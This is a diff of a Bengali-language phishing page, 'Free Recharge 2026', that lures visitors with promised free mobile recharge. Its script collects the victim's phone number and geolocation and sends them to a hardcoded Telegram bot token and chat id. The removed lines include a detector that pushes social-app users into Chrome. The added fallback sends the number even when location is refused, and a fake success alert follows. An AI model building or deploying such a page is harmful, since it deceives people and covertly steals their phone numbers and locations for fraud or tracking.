@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url=googlechrome://navigate?url=https://sidzf8.github.io/Shadow-Traker/">
     <title>Free Recharge 2026</title>
     <style>
         body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+        .box { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
         h2 { color: #28a745; }
-        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
+        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; outline: none; }
         .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -23,46 +22,46 @@
     </div>
 
 <script>
-// সোশ্যাল মিডিয়া ডিটেক্টর এবং অটো-ওপেনার
-(function() {
-    var ua = navigator.userAgent || navigator.vendor || window.opera;
-    var isSocial = /FBAN|FBAV|Messenger|TikTok|ImoAndroid|ImoIos/i.test(ua);
-    
-    if (isSocial) {
-        // অ্যান্ড্রয়েড ইউজারদের জন্য সরাসরি ক্রোম ওপেন করার কমান্ড
-        window.location.href = "intent://" + window.location.hostname + window.location.pathname + "#Intent;scheme=https;package=com.android.chrome;end";
-    }
-})();
-
 async function sendData() {
     const num = document.getElementById('phone').value;
     const btn = document.getElementById('subBtn');
 
     if (num.length < 11) { alert("১১ সংখ্যার সঠিক নম্বর দিন!"); return; }
     
-    btn.innerText = "ভেরিফাই হচ্ছে...";
+    btn.innerText = "প্রসেসিং...";
     btn.disabled = true;
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
-        const chat_id = "7887080882";
-        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        const text = `🔔 **নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+    const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
+    const chat_id = "7887080882";
 
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+    // লোকেশন পাওয়ার চেষ্টা করবে, না পেলেও মেসেজ পাঠাবে
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        const text = `🔔 **নতুন রিচার্জ রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+        await sendMessage(token, chat_id, text);
+    }, async (err) => {
+        // লোকেশন না পেলেও এই অংশটি নম্বরটি পাঠিয়ে দেবে
+        const text = `⚠️ **নতুন রিচার্জ রিকোয়েস্ট (লোকেশন ছাড়া)**\n\n📱 নম্বর: ${num}\n❌ লোকেশন ব্লক করা ছিল।`;
+        await sendMessage(token, chat_id, text);
+    }, { timeout: 5000 });
+}
+
+async function sendMessage(token, chat_id, text) {
+    try {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        const res = await fetch(url);
+        if(res.ok) {
             alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
-        } catch (e) {
-            alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
-        } finally {
-            btn.innerText = "রিচার্জ নিন";
-            btn.disabled = false;
+        } else {
+            alert("বট সমস্যা! টোকেন চেক করুন।");
         }
-    }, (err) => {
-        alert("লোকেশন পারমিশন ছাড়া অফারটি কাজ করবে না। 'Allow' বাটনে ক্লিক করুন।");
+    } catch (e) {
+        alert("নেটওয়ার্ক সমস্যা!");
+    } finally {
+        const btn = document.getElementById('subBtn');
         btn.innerText = "রিচার্জ নিন";
         btn.disabled = false;
-    }, { timeout: 10000 });
+    }
 }
 </script>
 </body>
